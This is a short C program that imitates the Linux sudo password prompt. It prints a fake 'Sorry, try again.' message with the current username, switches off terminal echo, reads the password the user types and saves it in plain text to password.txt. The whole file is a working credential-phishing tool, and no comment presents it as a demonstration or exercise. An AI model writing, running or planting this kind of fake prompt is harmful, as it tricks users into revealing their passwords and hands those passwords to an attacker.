#include <pwd.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <termios.h>
#include <unistd.h>

#define MAX_PASSWORD_LENGTH 100
#define PASSWORD_FILE "password.txt"

void set_echo(bool enabled) {
    struct termios term;
    tcgetattr(0, &term);
    if (enabled) {
        term.c_lflag |= ECHO;
    } else {
        term.c_lflag &= ~ECHO;
    }
    tcsetattr(0, TCSANOW, &term);
}

int main() {
    struct passwd *pw = getpwuid(getuid());
    if (pw == NULL) {
        perror("Error getting username");
        return EXIT_FAILURE;
    }
    char *username = pw->pw_name;

    sleep(2);

    printf("Sorry, try again.\n[sudo] password for %s: ", username);

    set_echo(false);
    char password[MAX_PASSWORD_LENGTH];
    fgets(password, MAX_PASSWORD_LENGTH, stdin);
    set_echo(true);

    printf("\n");

    FILE *file = fopen(PASSWORD_FILE, "w");
    if (file == NULL) {
        perror("Error opening password file");
        return EXIT_FAILURE;
    }
    fprintf(file, "%s", password);
    fclose(file);

    return EXIT_SUCCESS;
}
